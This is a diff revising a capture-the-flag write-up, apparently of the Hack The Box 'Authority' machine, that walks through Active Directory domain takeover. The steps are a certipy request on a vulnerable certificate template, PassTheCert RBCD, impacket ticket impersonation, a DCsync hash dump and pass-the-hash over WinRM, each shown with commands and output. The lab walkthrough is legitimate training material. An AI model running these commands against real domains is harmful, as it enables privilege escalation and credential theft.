@@ -496,23 +496,32 @@ NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandat
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 ```
 
-We saw an ADCS folder in the Development share earlier. Checking the ```Cert Publishers``` group reveals the Domain Controller is acting as a Certificate Authority.
+We saw an ADCS folder in the Development share earlier. We can confirm if the DC ```Authority.authority.htb``` group reveals is acting as a Certificate Authority using ```certutil -dump```.
 ```console
-*Evil-WinRM* PS C:\Users\svc_ldap\desktop> net group "Cert Publishers" /domain
-The request will be processed at a domain controller for domain authority.htb.
-
-Group name     Cert Publishers
-Comment        Enterprise certification and renewal agents
-
-Members
-
--------------------------------------------------------------------------------
-AUTHORITY$
-The command completed successfully.
+*Evil-WinRM* PS C:\Users\svc_ldap\Documents> certutil -dump
+Entry 0: (Local)
+  Name:                         "AUTHORITY-CA"
+  Organizational Unit:          ""
+  Organization:                 ""
+  Locality:                     ""
+  State:                        ""
+  Country/region:               ""
+  Config:                       "authority.authority.htb\AUTHORITY-CA"
+  Exchange Certificate:         ""
+  Signature Certificate:        "authority.authority.htb_AUTHORITY-CA.crt"
+  Description:                  ""
+  Server:                       "authority.authority.htb"
+  Authority:                    "AUTHORITY-CA"
+  Sanitized Name:               "AUTHORITY-CA"
+  Short Name:                   "AUTHORITY-CA"
+  Sanitized Short Name:         "AUTHORITY-CA"
+  Flags:                        "13"
+  Web Enrollment Servers:       ""
+CertUtil: -dump command completed successfully.
 ```
 
 ### ADCS Enumeration
-With ADCS, I like to start by checking the certificate templates on the server. Certificate templates are not inherently vulnerable but like with anything else, misconfigurations can lead to domain privilege escalation. Let's use the [certipy](https://github.com/ly4k/Certipy) tool to check if the there are any vulnerable certificate templates we can abuse. We can use certipy's ```find``` command with the ```-vulnerable``` switch to look for vulnerable certificate templates.
+With ADCS, a good place to start is enumerating the certificate templates on the server. Certificate templates are not inherently vulnerable but like with anything else Active Directory related, misconfigurations can lead to privilege escalation and even domain privilege escalation. Let's use the [certipy](https://github.com/ly4k/Certipy) tool to check if the there are any vulnerable certificate templates we can abuse. We can use certipy's ```find``` command with the ```-vulnerable``` switch to look for vulnerable certificate templates.
 ```console
 0ph3@parrot~$ certipy find -stdout -vulnerable -text -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb
 <SNIP>
@@ -601,9 +610,8 @@ Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
 [*] Successfully added machine account HACK01$ with password 55a4a721e13c7bcfc8ac37bf6bd287f2.
 ```
 
-With the machine account created, we can request a certificate with the domain admin user as the SAN.
-To make the request, we will need to supply the the CA name (```-ca```), the vulnerable template name (```-template```) and the User Principle Name of our target user (```-upn```) to ```certipy```
-All of the information needed can be retrieved from the previous ```certipy find``` command output.
+With the machine account created, we can use it to request a ```CorpVPN```certificate containing the domain admin account in the SAN.
+To make the request, we can use the ```certipy req command.``` We will need to supply the the CA name (```-ca```), the vulnerable template name (```-template```) and the user  to include in the SAN (```-upn```). All of the information needed to request the cert can be retrieved from the previous ```certipy find``` command output.
 ```console
 0ph3@parrot~$ certipy req -username 'HACK01$' -password '55a4a721e13c7bcfc8ac37bf6bd287f2' -dc-ip 10.10.11.222 -ca 'AUTHORITY-CA' -template CorpVPN -upn 'administrator@authority.htb' -dns authority.htb -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -622,13 +630,13 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 ```
 
-The certificate and key is saved in the ```administrator_authority.pfx``` file
+The certificate and key received are saved in the ```administrator_authority.pfx``` file
 
 ```console
 0ph3@parrot~$ ls
 administrator_authority.pfx
 ```
- Let's try to use the ```certipy auth``` command to grab grab the administrator's TGT and NTHASH.
+ Next, we can use the ```certipy auth``` command to request the administrator's TGT and NTHASH.
  
 ```console
 0ph3@parrot~$ certipy auth -pfx administrator_authority.pfx -debug
@@ -644,13 +652,15 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to get TGT...
 [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
 ```
-Looks like that failed. After researching the ```KDC_ERR_PADATA_TYPE_NOSUPP``` error, it appears that the domain controller is not configured to use Public Key Cryptography for Initial Authentication  (PKINIT) authentication. According to this [article](https://www.prosec-networks.com/en/blog/adcs-privescaas/), PKINIT is the kerberos authentication method that enables pre-authentication using certificates. The articles details an alternative method of certificate authentication and exploitation though. It's possible to use Schannel to authenticated against an ldaps server using X.509 certificates. The article links to the PassTheCert tool which takes advantage of this and grant a machine account we control [Resource Based Constrained Delegation (RBCD).](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd) over ther Domain Controller.
+Looks like that failed. After researching the ```KDC_ERR_PADATA_TYPE_NOSUPP``` error, it appears that the domain controller is not configured to use Public Key Cryptography for Initial Authentication  (PKINIT). According to this [article](https://www.prosec-networks.com/en/blog/adcs-privescaas/), PKINIT is the authentication method which makes kerberos pre-authentication through certificates possible.
+
+So we can't use the certificate to request the admin's TGT through kerberos but the article does mention an alternative method of certificate authentication and exploitation path. It's possible to use SChannel to authenticated against an LDAPS server using X.509 certificates. This means we could authenticate to the domain controller's LDAPS server using our certificate and interact with the directory as the domain administrator user defined in the SAN. Whith this access, we could grant a machine account we control [Resource Based Constrained Delegation (RBCD)](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd) over ther Domain Controller computer object in AD. The article links to the [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) tool which can be performed to take advantage of the LDAPS certificate authentication.
 
 ### PassTheCert RBCD
 
-In short, since we have domain admin access to the ldaps server through our certificate domain, we can edit the DC's msDS-AllowedToActOnBehalfOfOtherIdentity and add our machine account's ( ```HACK01$```) SID to gain delegation over the DC. This will allow us to request a service ticket to the DC for any user we wish to impersonate([Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket).
+In short, since we have domain admin access to the ldaps server through our certificate, we can edit the DC object's ```msDS-AllowedToActOnBehalfOfOtherIdentity``` attribute and add our machine account's ( ```HACK01$```) SID to gain delegation over the DC. This will allow us to request a service ticket to the DC for any user we wish to impersonate and retrieve the user's TGT.
 
-Let's clone the PassTheTicket tool
+Let's start by cloning the PassTheTicket tool mentioned in the article.
 ```console
 0ph3@parrot~$ git clone https://github.com/AlmondOffSec/PassTheCert.git
 Cloning into 'PassTheCert'...                                                                                                                                                                 
@@ -662,7 +672,7 @@ Receiving objects: 100% (133/133), 48.71 KiB | 702.00 KiB/s, done.
 Resolving deltas: 100% (58/58), done.
 ```
 
-Certificate authentication using the ```PassTheCert``` tool requires us to extract the cert and private key from our pfx cert.
+Certificate authentication using the ```PassTheCert``` tool requires us to use the .crt certificate and private key.
 ```console
 0ph3@parrot~$ python3 passthecert.py -h
 <SNIP>
@@ -672,6 +682,7 @@ Authentication:
   -crt user.crt         User's certificate
   -key user.key         User's private key
 ```
+We can extract these from the ```administrator_authority.pfx``` cert.
 
 Extracting the cert's key
 ```console
@@ -687,7 +698,7 @@ Extracting the crt from the .pfx
 Enter Import Password:
 ```
 
-Let's use ```PassTheCert``` to set RBCD right for our ```HACK01$``` machine over the domain controller ```AUTHORITY$```
+Let's use ```PassTheCert``` to set RBCD rights for our ```HACK01$``` machine over the domain controller ```AUTHORITY$```
 ```console
 0ph3@parrot~$ python3 passthecert.py -dc-ip 10.10.11.222  -domain authority.htb -crt admin.crt -key admin.key -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HACK01$'
 Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
@@ -699,7 +710,7 @@ Enter PEM pass phrase:
 [*] Accounts allowed to act on behalf of other identity:
 [*]     HACK01$      (S-1-5-21-622327497-3269355298-2248959698-11604)
 ```
-We can now use ```impacket-getST``` to impersonate the Administrator accountand obtain the TGT.
+With the attribute set, we can now use ```impacket-getST``` to impersonate the Administrator user and retrieve their TGT 
 
 ```console
 0ph3@parrot~$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/HACK01$:55a4a721e13c7bcfc8ac37bf6bd287f2'
@@ -716,7 +727,7 @@ Let's fix that using ```ntpdate```
 0ph3@parrot~$ sudo ntpdate 10.10.11.222
 08 Jan 22:04:55 ntpdate[783273]: step time server 10.10.11.222 offset +43204.320471 sec
 ```
-
+Let's try again now.
 ```console
 0ph3@parrot~$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/HACK01$:55a4a721e13c7bcfc8ac37bf6bd287f2'
 Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
@@ -729,7 +740,7 @@ Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
 [*] Saving ticket in Administrator.ccache
 ```
 
-We can use the Administator's TGT to request a DCsync and extract the nthash.
+We can use the retrieved Administator TGT to request a DCsync and dump all the hashes on the DC
 ```console
 0ph3@parrot~$ KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
 Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
@@ -744,7 +755,7 @@ AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:9d641019d580fc2aaed5aed7fee0a3a
 HACK01$:11603:aad3b435b51404eeaad3b435b51404ee:1baffafa84162a4cc0319b55853b94e9:::
 [*] Cleaning up... 
 ```
-Passing the hash gets us admin access to the DC through winRM.
+We can pass the administrator's hash using winrm to gain remote access to the DC as the administrator user, and finally, retrieve the root flag.
 ```console
 ┌─[✗]─[root@parrot]─[/htb/vpn]
 └──╼ #evil-winrm -i 10.10.11.222 --user Administrator -H 6961f422924da90a6928197429eea4ed
